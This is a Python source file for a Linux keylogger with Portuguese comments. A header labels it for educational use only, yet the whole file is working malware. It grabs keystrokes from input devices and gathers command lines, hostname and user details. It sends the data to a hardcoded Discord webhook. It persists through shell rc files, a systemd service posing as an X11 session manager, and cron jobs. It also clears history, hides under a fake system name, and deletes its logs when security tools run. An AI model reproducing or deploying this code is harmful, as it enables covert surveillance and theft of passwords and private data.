#!/usr/bin/env python3
"""
KEYLOGGER LINUX - APENAS PARA ESTUDO EDUCACIONAL
USO EXCLUSIVO EM AMBIENTES CONTROLADOS
"""

import os
import sys
import time
import json
import threading
import subprocess
import shutil
import hashlib
import random
from datetime import datetime
from pathlib import Path
import requests
import socket
import platform
import psutil

# ========== CONFIGURAÇÕES LINUX ==========
WEBHOOK_URL = "https://discord.com/api/webhooks/1425044577080836228/BpIwVskxVoWoqBAaFxYJI9gVj9s1JGGamhtdC-huBcUrWWufq2-bI1EcX_QAeLfkU7q2"
LOG_INTERVAL = 180  # 3 minutos
MAX_LOG_SIZE = 200

# Caminhos de persistência Linux
LINUX_PATHS = [
    os.path.expanduser("~/.bashrc"),
    os.path.expanduser("~/.zshrc"),
    os.path.expanduser("~/.profile"),
    os.path.expanduser("~/.bash_profile"),
    os.path.expanduser("~/.config/fish/config.fish"),
    "/etc/bash.bashrc",
    "/etc/profile"
]

class LinuxKeylogger:
    def __init__(self):
        self.log_data = []
        self.is_running = False
        self.session_id = self.generate_session_id()
        self.hidden_dir = Path(os.path.expanduser("~/.cache/systemd"))
        self.script_name = ".X11-service"
        
    def generate_session_id(self):
        """Gera ID de sessão único"""
        return hashlib.md5(f"{datetime.now()}{random.random()}".encode()).hexdigest()[:10]
    
    def setup_environment(self):
        """Configura ambiente Linux furtivo"""
        try:
            # Cria diretório oculto
            self.hidden_dir.mkdir(exist_ok=True)
            
            # Arquivos de log
            self.log_file = self.hidden_dir / f".xsession-{self.session_id}.log"
            self.error_file = self.hidden_dir / ".X11-errors.log"
            
            # Backup do script
            self.script_backup = self.hidden_dir / self.script_name
            if os.path.exists(__file__):
                shutil.copy2(__file__, self.script_backup)
                os.chmod(self.script_backup, 0o755)
                
            # Torna diretório oculto
            os.system(f"chattr +i {self.hidden_dir} 2>/dev/null")
            
            self.log_message("Linux environment setup completed")
            return True
            
        except Exception as e:
            self.log_error(f"Setup error: {e}")
            return False

    def install_persistence(self):
        """Instala persistência no Linux"""
        try:
            activation_cmds = [
                f"\n# X11 Session Service\npython3 {self.script_backup} > /dev/null 2>&1 &\n",
                f"\n# System daemon\nnohup python3 {self.script_backup} & disown\n",
                f"\n# User service\n({python3} {self.script_backup} &) >/dev/null 2>&1\n"
            ]
            
            installed = False
            for linux_path in LINUX_PATHS:
                try:
                    path = Path(linux_path)
                    if path.parent.exists():
                        cmd = random.choice(activation_cmds)
                        with open(path, 'a') as f:
                            f.write(cmd)
                        installed = True
                        self.log_message(f"Persistence added to: {linux_path}")
                except Exception:
                    continue
            
            # Systemd service
            self.create_systemd_service()
            # Cron job
            self.install_cron_job()
            
            return installed
            
        except Exception as e:
            self.log_error(f"Persistence error: {e}")
            return False

    def create_systemd_service(self):
        """Cria serviço systemd"""
        try:
            service_content = f"""[Unit]
Description=X11 Session Manager
After=graphical.target

[Service]
Type=simple
ExecStart=python3 {self.script_backup}
Restart=always
RestartSec=10
User={os.getenv('USER')}
Environment=DISPLAY=:0

[Install]
WantedBy=graphical.target
"""
            
            service_file = f"/home/{os.getenv('USER')}/.config/systemd/user/xsession.service"
            os.makedirs(os.path.dirname(service_file), exist_ok=True)
            
            with open(service_file, 'w') as f:
                f.write(service_content)
                
            os.system(f"systemctl --user enable {service_file} 2>/dev/null")
            
        except Exception as e:
            pass

    def install_cron_job(self):
        """Instala cron job"""
        try:
            cron_cmd = f"@reboot python3 {self.script_backup} > /dev/null 2>&1\n"
            
            # Método 1: crontab
            os.system(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -')
            
            # Método 2: arquivo cron
            cron_file = f"/var/spool/cron/crontabs/{os.getenv('USER')}"
            if os.path.exists(os.path.dirname(cron_file)):
                with open(cron_file, 'a') as f:
                    f.write(cron_cmd)
                    
        except Exception as e:
            pass

    def capture_linux_input(self):
        """Captura input no Linux usando múltiplos métodos"""
        try:
            # Thread para evdev (requer root)
            def evdev_capture():
                while self.is_running:
                    try:
                        self.capture_evdev_events()
                        time.sleep(0.1)
                    except Exception as e:
                        time.sleep(5)
            
            # Thread para X11 (requer acesso ao display)
            def x11_capture():
                while self.is_running:
                    try:
                        self.capture_x11_events()
                        time.sleep(0.1)
                    except Exception as e:
                        time.sleep(5)
            
            # Thread para terminal
            def terminal_capture():
                while self.is_running:
                    try:
                        self.capture_terminal_input()
                        time.sleep(0.05)
                    except Exception as e:
                        time.sleep(2)
            
            # Thread para informações do sistema
            def system_info_capture():
                while self.is_running:
                    try:
                        self.capture_system_data()
                        time.sleep(60)
                    except Exception as e:
                        time.sleep(30)
            
            # Inicia threads
            threading.Thread(target=evdev_capture, daemon=True).start()
            threading.Thread(target=x11_capture, daemon=True).start()
            threading.Thread(target=terminal_capture, daemon=True).start()
            threading.Thread(target=system_info_capture, daemon=True).start()
            
        except Exception as e:
            self.log_error(f"Capture setup error: {e}")

    def capture_evdev_events(self):
        """Captura eventos de input via evdev"""
        try:
            # Monitora dispositivos de input
            input_devices = ["/dev/input/event*", "/dev/input/by-path/*"]
            
            for device_pattern in input_devices:
                devices = subprocess.run(
                    ['find', '/dev/input', '-name', 'event*'],
                    capture_output=True, text=True
                )
                
                for device in devices.stdout.split('\n'):
                    if device and self.is_running:
                        try:
                            # Usando evtest para capturar eventos
                            process = subprocess.Popen(
                                ['evtest', '--grab', device],
                                stdout=subprocess.PIPE,
                                stderr=subprocess.DEVNULL,
                                text=True,
                                bufsize=1
                            )
                            
                            # Lê eventos por um tempo limitado
                            start_time = time.time()
                            while time.time() - start_time < 10 and self.is_running:
                                line = process.stdout.readline()
                                if 'EV_KEY' in line and 'press' in line.lower():
                                    self.process_evdev_event(line, device)
                        except:
                            pass
                        
        except Exception as e:
            pass

    def process_evdev_event(self, event_line, device):
        """Processa eventos evdev"""
        try:
            timestamp = datetime.now().isoformat()
            
            # Mapeamento básico de códigos de tecla
            key_map = {
                'KEY_A': 'a', 'KEY_B': 'b', 'KEY_C': 'c', 'KEY_D': 'd', 'KEY_E': 'e',
                'KEY_F': 'f', 'KEY_G': 'g', 'KEY_H': 'h', 'KEY_I': 'i', 'KEY_J': 'j',
                'KEY_1': '1', 'KEY_2': '2', 'KEY_3': '3', 'KEY_4': '4', 'KEY_5': '5',
                'KEY_SPACE': ' ', 'KEY_ENTER': '[ENTER]', 'KEY_BACKSPACE': '[BACKSPACE]',
                'KEY_ESC': '[ESC]', 'KEY_TAB': '[TAB]', 'KEY_LEFTCTRL': '[CTRL]'
            }
            
            for code, key in key_map.items():
                if code in event_line:
                    key_data = {
                        'timestamp': timestamp,
                        'key': key,
                        'type': 'evdev',
                        'session': self.session_id,
                        'device': os.path.basename(device)
                    }
                    self.add_to_log(key_data)
                    break
                    
        except Exception as e:
            pass

    def capture_x11_events(self):
        """Captura eventos X11 (simulação)"""
        try:
            # Em implementação real, usaria xinput ou xev
            if 'DISPLAY' in os.environ:
                # Simula captura de eventos X11
                pass
                
        except Exception as e:
            pass

    def capture_terminal_input(self):
        """Captura input do terminal atual"""
        try:
            # Monitora processos de terminal
            terminal_processes = ['bash', 'zsh', 'fish', 'sh', 'tmux', 'screen']
            
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if any(term in proc.info['name'].lower() for term in terminal_processes):
                        # Captura informações do processo
                        proc_info = {
                            'timestamp': datetime.now().isoformat(),
                            'type': 'process_info',
                            'session': self.session_id,
                            'process': proc.info['name'],
                            'pid': proc.info['pid'],
                            'cmdline': ' '.join(proc.info['cmdline'] or [])[:100]
                        }
                        self.add_to_log(proc_info)
                except:
                    pass
                    
        except Exception as e:
            pass

    def capture_system_data(self):
        """Captura dados do sistema"""
        try:
            system_info = {
                'timestamp': datetime.now().isoformat(),
                'type': 'system_info',
                'session': self.session_id,
                'hostname': socket.gethostname(),
                'user': os.getenv('USER'),
                'distribution': platform.freedesktop_os_id() if hasattr(platform, 'freedesktop_os_id') else platform.system(),
                'memory_used': psutil.virtual_memory().percent,
                'cpu_usage': psutil.cpu_percent(),
                'disk_usage': psutil.disk_usage('/').percent
            }
            
            self.add_to_log(system_info)
            
            # Captura janelas ativas (requer xprop)
            try:
                active_window = subprocess.run(
                    ['xprop', '-root', '_NET_ACTIVE_WINDOW'],
                    capture_output=True, text=True
                )
                if active_window.returncode == 0:
                    window_info = {
                        'timestamp': datetime.now().isoformat(),
                        'type': 'active_window',
                        'session': self.session_id,
                        'window_id': active_window.stdout.strip()
                    }
                    self.add_to_log(window_info)
            except:
                pass
                
        except Exception as e:
            self.log_error(f"System data error: {e}")

    def add_to_log(self, data):
        """Adiciona dados ao log"""
        self.log_data.append(data)
        self.save_local_backup(data)
        
        # Envia se atingir limite
        if len(self.log_data) >= 15:
            self.send_data_safe()

    def save_local_backup(self, data):
        """Salva backup local"""
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(json.dumps(data) + '\n')
        except Exception as e:
            pass

    def send_data_safe(self):
        """Envia dados com segurança"""
        if not self.log_data:
            return
            
        try:
            data_to_send = self.log_data.copy()
            self.log_data = []
            
            threading.Thread(target=self.send_to_discord, args=(data_to_send,), daemon=True).start()
            
        except Exception as e:
            self.log_data.extend(data_to_send)

    def send_to_discord(self, data):
        """Envia dados para Discord"""
        max_retries = 2
        
        for attempt in range(max_retries):
            try:
                if not data:
                    return
                    
                # Prepara chunks
                chunks = [data[i:i+10] for i in range(0, len(data), 10)]
                
                for chunk in chunks:
                    if self.send_chunk(chunk):
                        time.sleep(1)
                    else:
                        time.sleep(5)
                
                break
                
            except Exception as e:
                if attempt < max_retries - 1:
                    time.sleep(10)
                else:
                    # Restaura dados se falhar
                    self.log_data.extend(data)

    def send_chunk(self, chunk):
        """Envia um chunk de dados"""
        try:
            # Filtra dados por tipo
            key_events = [item for item in chunk if item.get('key')]
            system_events = [item for item in chunk if item.get('type') in ['system_info', 'process_info']]
            
            embed_color = 0x3498db
            
            fields = []
            
            if key_events:
                key_text = "\n".join([f"{e.get('timestamp', '')[-8:]} - {e.get('key', '')}" 
                                    for e in key_events[:8]])
                fields.append({
                    "name": "⌨️ Key Events",
                    "value": f"```{key_text}```",
                    "inline": False
                })
            
            if system_events:
                sys_text = "\n".join([f"{e.get('type', '')}: {e.get('process', e.get('hostname', ''))}" 
                                    for e in system_events[:3]])
                fields.append({
                    "name": "🖥️ System Info",
                    "value": f"```{sys_text}```",
                    "inline": True
                })
            
            payload = {
                "embeds": [{
                    "title": "🐧 Linux System Monitor",
                    "color": embed_color,
                    "fields": fields,
                    "footer": {
                        "text": f"Session: {self.session_id} | {len(chunk)} events"
                    },
                    "timestamp": datetime.now().isoformat()
                }]
            }
            
            response = requests.post(
                WEBHOOK_URL,
                json=payload,
                timeout=15,
                headers={
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                }
            )
            
            return response.status_code in [200, 204]
            
        except Exception as e:
            return False

    def enable_stealth_mode(self):
        """Ativa modo stealth"""
        try:
            # Limpa histórico
            os.system('history -c 2>/dev/null')
            # Baixa prioridade
            os.nice(10)
            # Remove variáveis sensíveis
            os.environ.pop('PYTHON_KEYLOGGER', None)
            
        except Exception as e:
            pass

    def security_monitor(self):
        """Monitor de segurança"""
        def monitor_loop():
            while self.is_running:
                try:
                    # Verifica processos de segurança
                    threats = ['wireshark', 'tcpdump', 'clamav', 'rkhunter', 'chkrootkit']
                    
                    for proc in psutil.process_iter(['name']):
                        if any(threat in proc.info['name'].lower() for threat in threats):
                            self.trigger_evasion()
                            break
                            
                    time.sleep(60)
                    
                except Exception as e:
                    time.sleep(120)
        
        threading.Thread(target=monitor_loop, daemon=True).start()

    def trigger_evasion(self):
        """Protocolo de evasão"""
        try:
            self.is_running = False
            time.sleep(180)
            
            # Limpa logs
            if hasattr(self, 'log_file') and os.path.exists(self.log_file):
                os.remove(self.log_file)
                
            self.is_running = True
            
        except Exception as e:
            pass

    def log_message(self, message):
        """Log de mensagens"""
        print(f"[LINUX] {message}")

    def log_error(self, error):
        """Log de erros"""
        try:
            with open(self.error_file, 'a') as f:
                f.write(f"{datetime.now()}: {error}\n")
        except:
            pass

    def start_linux_mode(self):
        """Inicia modo Linux"""
        self.log_message("Starting Linux monitoring...")
        
        if not self.setup_environment():
            return False
            
        self.install_persistence()
        self.enable_stealth_mode()
        self.security_monitor()
        
        self.is_running = True
        self.capture_linux_input()
        
        # Loop de envio automático
        def auto_send_loop():
            while self.is_running:
                try:
                    if len(self.log_data) > 0:
                        self.send_data_safe()
                    time.sleep(LOG_INTERVAL)
                except Exception as e:
                    time.sleep(60)
        
        threading.Thread(target=auto_send_loop, daemon=True).start()
        
        self.log_message("Linux monitoring activated")
        return True

    def stop(self):
        """Para o sistema"""
        self.is_running = False
        if self.log_data:
            self.send_data_safe()

# Verificação de ambiente
if __name__ == "__main__":
    # Verifica se é Linux
    if not sys.platform.startswith('linux'):
        print("Este script é apenas para sistemas Linux")
        sys.exit(1)
    
    # Verificação de permissões
    if os.geteuid() == 0:
        print("⚠️  Executando como root - acesso ampliado")
    
    keylogger = LinuxKeylogger()
    
    try:
        if keylogger.start_linux_mode():
            # Loop principal
            while True:
                time.sleep(300)
        else:
            print("Falha na inicialização")
            
    except KeyboardInterrupt:
        keylogger.stop()
        print("\nMonitoramento interrompido")
    except Exception as e:
        keylogger.stop()
        print(f"Erro: {e}")
